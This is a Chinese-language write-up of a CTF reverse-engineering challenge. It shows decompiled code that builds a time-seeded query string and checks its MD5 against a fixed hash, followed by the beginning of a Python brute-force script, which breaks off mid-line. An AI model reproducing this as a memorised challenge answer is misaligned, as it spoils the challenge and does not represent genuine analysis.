<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_140001D05</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD &quot;+&quot; TO EXPAND]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">sub_140002180</span>(a1, a2);</span><br><span class="line">  <span class="built_in">sub_14000A510</span>(a1, a2, v2, (<span class="type">unsigned</span> <span class="type">int</span>)v53, v3, v4);</span><br><span class="line">  v58 = <span class="built_in">get_time</span>(a1, a2, v5, <span class="number">0</span>, v6, v7);</span><br><span class="line">  <span class="keyword">if</span> ( v58 &gt; <span class="number">1751990400</span> &amp;&amp; v58 &lt;= <span class="number">1752052051</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">gen_query</span>(a1, a2, v8, (<span class="type">unsigned</span> <span class="type">int</span>)v49, v9, v10);</span><br><span class="line">    v57 = &amp;v54;</span><br><span class="line">    v12 = std::string::<span class="built_in">c_str</span>(a1, a2, v11, v49);</span><br><span class="line">    v15 = <span class="built_in">md5</span>(a1, a2, v12, (<span class="type">unsigned</span> <span class="type">int</span>)v53, v13, v14, v41);</span><br><span class="line">    <span class="built_in">sub_14000A820</span>(a1, a2, v15, (<span class="type">unsigned</span> <span class="type">int</span>)v50, (<span class="type">unsigned</span> <span class="type">int</span>)&amp;v54, v16, v42, v47);</span><br><span class="line">    <span class="built_in">sub_14000A6E0</span>(a1, a2, v17, (<span class="type">unsigned</span> <span class="type">int</span>)&amp;v54, v18, v19, v43);</span><br><span class="line">    v20 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(a1, a2, <span class="string">&quot;query: &quot;</span>, &amp;std::cout);</span><br><span class="line">    v21 = std::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="type">char</span>&gt;(a1, a2, v49, v20);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(a1, a2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;, v21);</span><br><span class="line">    v22 = std::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="type">char</span>&gt;(a1, a2, v50, &amp;std::cout);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(a1, a2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;, v22);</span><br><span class="line">    std::string::~<span class="built_in">string</span>(a1, a2, v23, v50);</span><br><span class="line">    std::string::~<span class="built_in">string</span>(a1, a2, v24, v49);</span><br><span class="line">  &#125;</span><br><span class="line">  std::string::<span class="built_in">basic_string</span>(a1, a2, v8, v52);</span><br><span class="line">  v25 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(a1, a2, <span class="string">&quot;Please input the right query string I used:&quot;</span>, &amp;std::cout);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(a1, a2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;, v25);</span><br><span class="line">  std::<span class="keyword">operator</span>&gt;&gt;&lt;<span class="type">char</span>&gt;(a1, a2, v52, &amp;std::cin);</span><br><span class="line">  v56 = &amp;v55;</span><br><span class="line">  v27 = std::string::<span class="built_in">c_str</span>(a1, a2, v26, v52);</span><br><span class="line">  v30 = <span class="built_in">md5</span>(a1, a2, v27, (<span class="type">unsigned</span> <span class="type">int</span>)v53, v28, v29, v41);</span><br><span class="line">  <span class="built_in">sub_14000A820</span>(a1, a2, v30, (<span class="type">unsigned</span> <span class="type">int</span>)v51, (<span class="type">unsigned</span> <span class="type">int</span>)&amp;v55, v31, v44, v47);</span><br><span class="line">  <span class="built_in">sub_14000A6E0</span>(a1, a2, v32, (<span class="type">unsigned</span> <span class="type">int</span>)&amp;v55, v33, v34, v45);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)<span class="built_in">sub_14000A8E0</span>(</span><br><span class="line">                          a1,</span><br><span class="line">                          a2,</span><br><span class="line">                          (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;8a2fc1e9e2830c37f8a7f51572a640aa&quot;</span>,</span><br><span class="line">                          (<span class="type">unsigned</span> <span class="type">int</span>)v51,</span><br><span class="line">                          v35,</span><br><span class="line">                          v36,</span><br><span class="line">                          v46,</span><br><span class="line">                          v48) )</span><br><span class="line">    v37 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(a1, a2, <span class="string">&quot;Congratulations!&quot;</span>, &amp;std::cout);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v37 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(a1, a2, <span class="string">&quot;Wrong!&quot;</span>, &amp;std::cout);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(a1, a2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;, v37);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(a1, a2, v38, v51);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(a1, a2, v39, v52);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出我们需要得到正确的query并满足query md5加密后的值等于8a2fc1e9e2830c37f8a7f51572a640aa；if里是对时间的判断显然是告诉我们要爆破的话时间范围是(1751990400,1752052051)</p>
<p>进入gen_query可以看到各个参数的生成，可以看到两种query，一种是满足pow_like函数的判断则没有a、b、x、y参数，但多了cipher参数；get_rand是模拟生成随机数</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_140001963</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">__time64_t</span> *a1,</span></span></span><br><span class="line"><span class="params"><span class="function">        __int64 a2,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">int</span> a3,</span></span></span><br><span class="line"><span class="params"><span class="function">        __int64 a4,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">int</span> a5,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">int</span> a6,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">double</span> a7,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">double</span> a8,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">double</span> a9,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">double</span> a10)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD &quot;+&quot; TO EXPAND]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">sub_140001518</span>((_DWORD)a1, a2, a3, (<span class="type">unsigned</span> <span class="type">int</span>)v51, a5, a6);</span><br><span class="line">  time = <span class="built_in">get_time</span>(a1);</span><br><span class="line">  <span class="built_in">sub_1400014B5</span>((_DWORD)a1, a2, v10, time, v11, v12);</span><br><span class="line">  v58 = <span class="number">0</span>;</span><br><span class="line">  v57 = <span class="number">0</span>;</span><br><span class="line">  v56 = <span class="number">0</span>;</span><br><span class="line">  v55 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; (<span class="type">int</span>)<span class="built_in">gen_rand</span>(); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v58 = <span class="built_in">gen_rand</span>();</span><br><span class="line">    v57 = <span class="built_in">gen_rand</span>();</span><br><span class="line">    v56 = <span class="built_in">gen_rand</span>();</span><br><span class="line">    v55 = <span class="built_in">gen_rand</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  v52 = <span class="built_in">gen_rand</span>();</span><br><span class="line">  std::basic_stringstream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;::<span class="built_in">basic_stringstream</span>(a1, a2, v13, v49);</span><br><span class="line">  v14 = (<span class="type">double</span>)dword_14000B<span class="number">0E0</span>;</span><br><span class="line">  v15 = (<span class="type">double</span>)(<span class="type">int</span>)(v58 | v56);</span><br><span class="line">  v18 = v14 * <span class="built_in">pow_like</span>(v15, <span class="number">2.0</span>, v15, a10, v16, v17, (<span class="type">double</span>)dword_14000B<span class="number">0E0</span>);</span><br><span class="line">  v19 = (<span class="type">double</span>)dword_14000B<span class="number">0E4</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v18 == <span class="built_in">pow_like</span>((<span class="type">double</span>)(<span class="type">int</span>)(v57 | v55), <span class="number">2.0</span>, v15, (<span class="type">double</span>)(<span class="type">int</span>)(v57 | v55), v20, v21, v18) * v19 )</span><br><span class="line">  &#123;</span><br><span class="line">    v22 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(a1, a2, <span class="string">&quot;salt=&quot;</span>, v50);</span><br><span class="line">    v23 = std::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="type">char</span>&gt;(a1, a2, v51, v22);</span><br><span class="line">    v24 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(a1, a2, <span class="string">&quot;&amp;t=&quot;</span>, v23);</span><br><span class="line">    v25 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(a1, a2, time, v24);</span><br><span class="line">    v26 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(a1, a2, <span class="string">&quot;&amp;r=&quot;</span>, v25);</span><br><span class="line">    v27 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(a1, a2, v52, v26);</span><br><span class="line">    v28 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(a1, a2, <span class="string">&quot;&amp;cipher=&quot;</span>, v27);</span><br><span class="line">    v31 = <span class="built_in">sub_14000184D</span>((_DWORD)a1, a2, time, v52, v29, v30, v48);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(a1, a2, v31, v28);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v32 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(a1, a2, <span class="string">&quot;salt=&quot;</span>, v50);</span><br><span class="line">    v33 = std::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="type">char</span>&gt;(a1, a2, v51, v32);</span><br><span class="line">    v34 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(a1, a2, <span class="string">&quot;&amp;t=&quot;</span>, v33);</span><br><span class="line">    v35 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(a1, a2, time, v34);</span><br><span class="line">    v36 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(a1, a2, <span class="string">&quot;&amp;r=&quot;</span>, v35);</span><br><span class="line">    v37 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(a1, a2, v52, v36);</span><br><span class="line">    v38 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(a1, a2, <span class="string">&quot;&amp;a=&quot;</span>, v37);</span><br><span class="line">    v39 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(a1, a2, v58, v38);</span><br><span class="line">    v40 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(a1, a2, <span class="string">&quot;&amp;b=&quot;</span>, v39);</span><br><span class="line">    v41 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(a1, a2, v57, v40);</span><br><span class="line">    v42 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(a1, a2, <span class="string">&quot;&amp;x=&quot;</span>, v41);</span><br><span class="line">    v43 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(a1, a2, v56, v42);</span><br><span class="line">    v44 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(a1, a2, <span class="string">&quot;&amp;y=&quot;</span>, v43);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(a1, a2, v55, v44);</span><br><span class="line">  &#125;</span><br><span class="line">  std::basic_stringstream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;::<span class="built_in">str</span>(a1, a2, v49, a4);</span><br><span class="line">  std::basic_stringstream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;::~<span class="built_in">basic_stringstream</span>(a1, a2, v45, v49);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(a1, a2, v46, v51);</span><br><span class="line">  <span class="keyword">return</span> a4;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">__int64 <span class="title">gen_rand</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v1 = (((dword_14000B040 &lt;&lt; <span class="number">13</span>) ^ (<span class="type">unsigned</span> <span class="type">int</span>)dword_14000B040) &gt;&gt; <span class="number">17</span>) ^ (dword_14000B040 &lt;&lt; <span class="number">13</span>) ^ dword_14000B040;</span><br><span class="line">  dword_14000B040 = (<span class="number">32</span> * v1) ^ v1;</span><br><span class="line">  <span class="keyword">return</span> dword_14000B040 &amp; <span class="number">0x7FFFFFFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_1400014B5</span><span class="params">(_DWORD a1, _DWORD a2, _DWORD a3, <span class="type">unsigned</span> <span class="type">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [rsp+10h] [rbp+10h]</span></span><br><span class="line"></span><br><span class="line">  v5 = a4;</span><br><span class="line">  <span class="keyword">if</span> ( !a4 )</span><br><span class="line">    v5 = <span class="number">1</span>;</span><br><span class="line">  result = v5;</span><br><span class="line">  dword_14000B040 = v5;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调试可以发现dword_14000B040初始值为get_time返回的time，此外salt值固定为tlkyeueq7fej8vtzitt26yl24kswrgm5，因此a、b、x、y实际上都和t相关</p>
<p>因此首先我写了个python脚本来爆破（c不擅长，部分函数如sub_14000184D直接让gemini分析生成模拟代码，但事后发现其实没用到）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5, sha1</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen</span>(<span class="params">dword</span>):</span><br><span class="line">    v1 = ((((dword &lt;&lt; <span class="number">13</span>)&amp;<span class="number">0xffffffff</span>) ^ dword) &gt;&gt; <span class="number">17</span>) ^ ((dword &lt;&lt; <span class="number">13</span>)&amp;<span class="number">0xffffffff</span>) ^ dword</span><br><span class="line">    dword = (((<span class="number">32</span> * v1)&amp;<span class="number">0xffffffff</span>) ^ v1) &amp;<span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">return</span> dword, dword &amp; <span class="number">0x7FFFFFFF</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">S_BOX_TABLE_7FF65E2BC020 = [<span class="number">0x0000000E</span>, <span class="number">0x00000004</span>, <span class="number">0x0000000D</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000F</span>, <span class="number">0x0000000B</span>, <span class="number">0x00000008</span>, <span class="number">0x00000003</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000006</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000005</span>, <span class="number">0x00000009</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>]</span><br><span class="line"></span><br><span class="line">P_BOX_TABLE_7FF65E2BC0A0 = [<span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000009</span>, <span class="number">0x0000000D</span>, <span class="number">0x00000002</span>, <span class="number">0x00000006</span>, <span class="number">0x0000000A</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000003</span>, <span class="number">0x00000007</span>, <span class="number">0x0000000B</span>, <span class="number">0x0000000F</span>, <span class="number">0x00000004</span>, <span class="number">0x00000008</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000010</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_u32</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;将一个数转换为32位无符号整数&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> n &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_s32</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;将一个数转换为32位有符号整数&quot;&quot;&quot;</span></span><br><span class="line">    n = n &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">if</span> n &amp; <span class="number">0x80000000</span>:</span><br><span class="line">        <span class="keyword">return</span> n - <span class="number">0x100000000</span></span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_salt</span>(<span class="params">dword_array</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    对应 C++ 函数 sub_7FF65E2B1518</span></span><br><span class="line"><span class="string">    根据硬编码的 dword 数组生成一个32字符的 salt 字符串。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> dword_array:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;错误: dword_7FF65E2BB060 数组为空，请填写数据。&quot;</span>)</span><br><span class="line"></span><br><span class="line">    s = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v9 = dword_array[i]</span><br><span class="line">        v10 = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># C++ int 是32位的，Python int 是无限精度的，需要模拟32位行为</span></span><br><span class="line">        v9_s32 = to_s32(v9)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> v9_s32 &gt;= <span class="number">0</span>:</span><br><span class="line">            v10 = v9_s32 / <span class="number">3</span> + <span class="number">48</span></span><br><span class="line">        <span class="keyword">elif</span> v9_s32 &gt;= -<span class="number">728</span>:</span><br><span class="line">            <span class="comment"># ~v9 在C++中是对32位整数按位取反</span></span><br><span class="line">            v10 = ~v9_s32 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 这里的 sub_7FF65E2B31D0 / 1.0986... 被我们分析为 log3</span></span><br><span class="line">            <span class="comment"># math.log(x) 是 ln(x)，math.log(3) 是 ln(3)</span></span><br><span class="line">            <span class="comment"># log3(x) = ln(x) / ln(3)</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                log_val = math.log(-v9_s32) / math.log(<span class="number">3</span>)</span><br><span class="line">                v10 = log_val - <span class="number">6.0</span> + <span class="number">48.0</span></span><br><span class="line">            <span class="keyword">except</span> ValueError:</span><br><span class="line">                <span class="comment"># 如果 -v9_s32 &lt;= 0，log会出错，这里设置一个默认值</span></span><br><span class="line">                v10 = <span class="number">48</span>  <span class="comment"># &#x27;0&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将计算结果转换为字符</span></span><br><span class="line">        s.append(<span class="built_in">chr</span>(<span class="built_in">int</span>(v10) &amp; <span class="number">0xFF</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s_box_transform</span>(<span class="params">state, s_box_table</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    对应 C++ 函数 sub_7FF65E2B16C1 (S-盒替换)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> s_box_table:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;错误: S_BOX_TABLE_7FF65E2BC020 数组为空，请填写数据。&quot;</span>)</span><br><span class="line"></span><br><span class="line">    s = to_u32(state)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="comment"># 提取高4位作为索引</span></span><br><span class="line">        index = (s &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0xF</span></span><br><span class="line">        sbox_val = s_box_table[index]</span><br><span class="line">        <span class="comment"># (16 * s) 等价于 (s &lt;&lt; 4)</span></span><br><span class="line">        s = sbox_val | (s &lt;&lt; <span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span> to_u32(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p_box_transform</span>(<span class="params">state, p_box_table</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    对应 C++ 函数 sub_7FF65E2B1785 (P-盒置换)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> p_box_table:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;错误: 